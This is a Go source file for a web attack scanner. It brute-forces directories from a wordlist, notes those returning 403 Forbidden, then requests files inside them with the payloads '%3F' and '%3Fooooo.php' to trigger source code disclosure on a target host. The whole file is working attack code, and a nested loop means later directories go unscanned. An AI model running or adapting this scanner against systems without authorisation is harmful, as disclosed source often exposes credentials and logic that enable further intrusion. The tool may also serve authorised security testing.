package main

//
//

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
)

var wg sync.WaitGroup

// Configuration variables
var (
	webroot           = "/var/www/html" // The webroot path on the target server (no trailing slash)
	directoryWordlist = "dirs.txt"      // Wordlist for directory enumeration
	fileWordlist      = "lolol.txt"     // Wordlist for file enumeration
	schema            = "http"          // http or https
	payloads          = []string{"%3F", "%3Fooooo.php"} // Payloads to test for source code disclosure
	verbose           = false           // Verbose output flag
)

// List to hold directories that return a 403 status code
var forbiddenDirectories []string

func fetch(url string) (*http.Response, error) {
	// Always print the URL and status code if verbose is enabled
	if verbose {
		fmt.Printf("Requesting URL: %s\n", url)
	}
	resp, err := http.Get(url)
	if err != nil {
		fmt.Printf("Request error: %v\n", err)
		return nil, err
	}
	if verbose {
		fmt.Printf("Response Status Code: %d\n", resp.StatusCode)
	}
	return resp, nil
}

func enumerateDirectories(urlIpDomain string) {
	defer wg.Done()

	file, err := os.Open(directoryWordlist)
	if err != nil {
		fmt.Println("Error opening directory wordlist:", err)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		url := fmt.Sprintf("%s://%s/%s/", schema, urlIpDomain, line)

		resp, err := fetch(url)
		if err != nil {
			continue
		}

		if resp.StatusCode == http.StatusForbidden {
			fmt.Printf("403 Forbidden - Directory found: %s\n", line)
			forbiddenDirectories = append(forbiddenDirectories, line)
		}
		resp.Body.Close()
	}
}

func checkSourceCodeDisclosure(urlIpDomain string) {
	defer wg.Done()

	file, err := os.Open(fileWordlist)
	if err != nil {
		fmt.Println("Error opening file wordlist:", err)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for _, directory := range forbiddenDirectories {
		for scanner.Scan() {
			line := scanner.Text()
			for _, payload := range payloads {
				url := fmt.Sprintf("%s://%s/%s%s/%s%s", schema, urlIpDomain, directory, webroot, line, payload)

				resp, err := fetch(url)
				if err != nil {
					continue
				}

				if resp.StatusCode == http.StatusOK {
					fmt.Printf("200 OK - File found: %s\n", url)
				}
				resp.Body.Close()
			}
		}
	}
}

func main() {
	// Parse command-line arguments for target host and verbosity
	host := flag.String("host", "127.0.0.1", "Target IP or domain (default: 127.0.0.1)")
	flag.BoolVar(&verbose, "verbose", false, "Enable verbose output (default: false)")
	flag.Parse()

	urlIpDomain := *host

	// Enumerate directories and look for 403 Forbidden responses
	fmt.Println("Enumerating directories one level deep in webroot...")
	wg.Add(1)
	go enumerateDirectories(urlIpDomain)
	wg.Wait()

	// Attempt to find source code disclosures within 403 Forbidden directories
	fmt.Println("Checking for source code disclosures in 403 directories...")
	wg.Add(1)
	go checkSourceCodeDisclosure(urlIpDomain)
	wg.Wait()
}

//
//


//
//
